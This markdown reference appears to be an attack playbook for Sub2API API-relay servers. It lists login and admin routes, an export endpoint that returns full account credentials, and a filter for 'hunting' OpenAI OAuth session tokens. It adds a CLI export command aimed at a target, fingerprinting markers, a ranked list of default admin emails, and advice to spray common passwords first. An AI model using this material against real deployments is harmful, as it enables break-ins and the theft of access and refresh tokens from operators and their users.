# Sub2API reference

Upstream project: [Wei-Shaw/sub2api](https://github.com/Wei-Shaw/sub2api)  
Context7: `/wei-shaw/sub2api`

Default listen port in sample configs: **8080**.

## Authentication

### Password login

```http
POST /api/v1/auth/login
Content-Type: application/json

{"email":"admin@example.com","password":"..."}
```

Response fields commonly include:

- `access_token`
- `refresh_token` (optional)
- `token_type`
- `expires_in`
- `user` (role must be admin for `/api/v1/admin/*`)

### Admin API key

```http
x-api-key: <admin-api-key>
```

Middleware accepts either `x-api-key` or `Authorization: Bearer <admin-jwt>`.

## High-value admin routes

| Method | Path | Purpose |
|--------|------|---------|
| GET | `/api/v1/admin/accounts` | Paginated account list |
| GET | `/api/v1/admin/accounts/:id` | Single account |
| GET | `/api/v1/admin/accounts/data` | **Full export including credentials** |
| POST | `/api/v1/admin/accounts/data` | Import backup payload |
| POST | `/api/v1/admin/accounts/import/codex-session` | Import Codex session JSON |
| GET | `/api/v1/admin/users/:id` | Admin user lookup |
| GET | `/api/v1/admin/groups/all` | Groups |
| GET | `/api/v1/admin/proxies/all` | Proxies |

### Export query params

From admin frontend `exportData`:

- `ids` — comma-separated account IDs
- or filters: `platform`, `type`, `status`, `group`, `privacy_mode`, `search`, `sort_by`, `sort_order`
- `include_proxies=false` — omit proxies from backup

Recommended GPT hunt filter:

```text
platform=openai&type=oauth&include_proxies=false
```

## Export payload

Conceptual Go structs:

- `DataPayload`: `exported_at`, `proxies`, `accounts`
- `DataAccount`: `name`, `platform`, `type`, `credentials` (map), plus scheduling fields

`credentials` for OAuth OpenAI accounts typically carry session material (`access_token`, `refresh_token`, `id_token`, account ids, plan).

Spark shadow accounts are excluded from credential export by upstream design.

## Operator CLI (optional)

If the Sub2API admin skill scripts are available:

```bash
export SUB2API_BASE_URL='https://target'
export SUB2API_JWT='<access_token>'
# or SUB2API_ADMIN_API_KEY=...

node scripts/sub2api-admin.js accounts list --page-size 20
node scripts/sub2api-admin.js accounts export \
  --platform openai --type oauth \
  --include-proxies false \
  --file accounts-export.json
```

## Fingerprint tips

- Title / body markers: `Sub2API`, `sub2api`
- Login JSON uses **email** (not username)
- Admin surface lives under `/api/v1/admin/`
- Unauthenticated export must fail; success without auth is an even higher severity finding

## Default / weak identity notes

Installers and field reports show default-like admin emails clustering around:

1. `admin@sub2api.local` (strongest empirical hit rate)
2. `admin@example.com`
3. `admin@sub2api.com`
4. `admin@localhost`
5. `test@sub2api.local`

Docker may auto-generate `ADMIN_PASSWORD` when unset — still spray common passwords first; generated secrets are out of band.

## Distinction vs New-API

| | Sub2API | New-API |
|--|---------|---------|
| Login field | email | username |
| Login path | `/api/v1/auth/login` | `/api/user/login` |
| Harvest target | upstream OAuth accounts export | user tokens / channels |
| Export | `/api/v1/admin/accounts/data` | token list APIs |
